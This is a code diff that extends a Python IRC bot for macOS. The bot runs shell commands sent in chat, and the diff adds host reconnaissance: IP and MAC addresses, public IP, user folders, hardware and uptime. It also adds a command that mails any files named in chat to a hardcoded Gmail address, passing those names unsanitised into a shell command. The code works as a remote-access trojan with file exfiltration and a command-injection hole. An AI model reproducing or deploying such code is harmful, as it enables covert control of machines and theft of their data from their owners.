@@ -13,7 +13,7 @@ from subprocess import Popen, PIPE, STDOUT
 import time
 from time import strftime, sleep
 
-version = 0.3
+version = 0.7
 
 def log(prefix, content=''):
    try:
@@ -41,8 +41,8 @@ helpmsg = 'Version: v%s\n\
 Available Commands: \n\
  1. !quit          #-- shutdown the bot \n\
  2. !reload        #-- reconnect to IRC \n\
- 3. public         #-- generic keyword for testing\n\
- 4. private        #-- generic keyword for testing\n\
+ 3. identify       #-- provide info on host system\n\
+ 4. email$         #-- send email to admin with attch listed after $\n\
  5. help           #-- display this message\n\
  6. $<command>     #-- run <command> in shell and capture live output\n\
  7. !cancel        #-- stop grabbing running command output\n' % version
@@ -166,6 +166,109 @@ def run(cmd, respond_method='priv'):
       log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
       log("\n")
 
+
+def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Test",attch=[]): # do not use attch.append() http://stackoverflow.com/a/113198/2156113
+   err = """\n
+      sudo mkdir -p /Library/Server/Mail/Data/spool\n
+      sudo /usr/sbin/postfix set-permissions\n
+      sudo /usr/sbin/postfix start
+      """
+   if len(attch) > 0:
+      for attachment in attch:
+         try:
+            cmd = 'uuencode %s %s | mailx -s "%s" %s' % (attachment.strip(), attachment.strip(), subj, to)
+            log('[+] Sending email...')
+            log('[<]    ',cmd)
+            sts = run(cmd, "pub")
+            return "Sending email to %s. (subject: %s, attachments: %s\n[X]: %s)" % (to, subj, str(attch), str(sts))
+         except Exception as error:
+            return str(error)
+   else:
+      p = os.popen("/usr/sbin/sendmail -t", "w")
+      p.write("To: %s" % to)
+      p.write("Subject: %s" % subj)
+      p.write("\n") # blank line separating headers from body
+      p.write('%s\n' % msg)
+      sts = p.close()
+   if sts != None:
+      return "Error: %s. Please fix Postfix with: %s" % (sts, err)
+   else:
+      return "Sent email to %s. (subject: %s, attachments: %s)" % (to, subj, str(attch))
+
+def identify():
+   log('[+] Running Identification Scripts...')
+   import platform
+   system = platform.mac_ver()[0]
+   log('[>]    OS X:    ',system)
+   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+   s.connect(("8.8.8.8",80))
+   local_ip = s.getsockname()[0]
+   s.close()
+   log('[>]    Local:   ',local_ip)
+   import urllib2
+   public_ip = urllib2.urlopen('http://ifconfig.me/ip').read()
+   log('[>]    Public:  ',public_ip)
+   import uuid
+   mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+   log('[>]    MAC:     ',mac_addr)
+   return "[v%s/x%s] %s@%s l: %s p: %s MAC: %s" % (version, system.strip(), local_user.strip(), hostname, local_ip, public_ip, mac_addr)
+
+def priv_identify():
+   log('[+] Running Identification Scripts...')
+   privmsg('[+] Running Identification Scripts...')
+   import platform
+   system = platform.mac_ver()[0]
+   log('[>]    OS X:    ',system)
+   privmsg('[>]      OS X:    %s' % system)
+
+   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+   s.connect(("8.8.8.8",80))
+   local_ip = s.getsockname()[0]
+   s.close()
+   log('[>]    Local:   ',local_ip)
+   privmsg('[>]      Local:   %s' % local_ip)
+
+   import urllib2
+   public_ip = urllib2.urlopen('http://ifconfig.me/ip').read()
+   log('[>]    Public:  ',public_ip)
+   privmsg('[>]      Public:  %s' % public_ip)
+
+   import uuid
+   mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+   log('[>]    MAC:     ',mac_addr)
+   privmsg('[>]      MAC:     %s' % mac_addr)
+
+   cmd = "system_profiler SPPowerDataType | grep Connected"
+   log('[>]    CMD:     ',cmd)
+   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
+   power = p.stdout.read()
+   log('[>]    Power:    ',power.strip())
+   privmsg('[>]      Power:    %s' % power.strip())
+
+   cmd = "uptime"
+   log('[>]    CMD:     ',cmd)
+   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
+   uptime = p.stdout.read()
+   log('[>]    UP:    ',uptime.strip())
+   privmsg('[>]      Up:    %s' % uptime.strip())
+
+   cmd = "cd /Users/; du -s * 2>/dev/null | sort -nr | head -1 | awk  '{print $2}'"
+   log('[>]    CMD:     ',cmd)
+   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
+   main_user = p.stdout.read()
+   log('[>]    User:    ',main_user.strip())
+   privmsg('[>]      User:    %s' % main_user.strip())
+
+   cmd = "system_profiler SPHardwareDataType"
+   log('[>]    CMD:     ',cmd)
+   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
+   hardware = p.stdout.read()
+   log('[>]    Hardware.')
+   privmsg(hardware)
+
+   privmsg('[√] Done.')
+
+
 ############The beef of things
 if len(nick) > 15: nick = '[%s]' % (local_user[:13])
 last_ping = time.time()
@@ -187,7 +290,7 @@ while not quit_status:
       irc.send ('NICK %s\r\n' % nick )
       irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
       irc.send ('JOIN %s\r\n' % channel)
-      irc.send ('PRIVMSG %s :Bot v%s Running.\r\n' % (admin, version))
+      broadcast('Bot v%s Running.' % version)
    except Exception as error:
       log('[*] Connection Failed: ')
       log('[X]    ',error)
@@ -213,10 +316,11 @@ while not quit_status:
       if data.find ('PING') != -1:                                     # im warning you, dont touch this bit
          irc.send ('PONG ' + data.split()[1] + '\r')
          last_ping = time.time()
-         log('[>]    PONG ' + data.split()[1] + '\r')
+         log('[+] Sent Data:')
+         log('[<]    PONG ',data.split()[1])
          timeout_count = 0    
 
-      elif data.find('Nickname is already in use') != -1:
+      elif data.find('ickname is already in use') != -1:
          nick += str(random.randint(1,200))
          if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
          timeout_count = 50
@@ -231,17 +335,22 @@ while not quit_status:
          irc.send ( 'QUIT\r\n' )
          break
 
-      elif scan('public'):
-         broadcast('Registered public keyword.')
+      elif scan('!identify'):
+         broadcast(identify())
 
-      elif privscan('private'):
-         privmsg('Registered private keyword.')
+      elif privscan('identify'):
+         priv_identify()
 
       elif privscan('help'):
          privmsg(helpmsg)
 
       elif scan('help'):
          broadcast(helpmsg)
+
+      elif scan('email$'):
+         attch = data.split("$")[1].split(',')
+         to = "nikisweeting+bot@gmail.com"
+         broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
 
       elif scan('$'):
          cmd = data.split("$")[1]
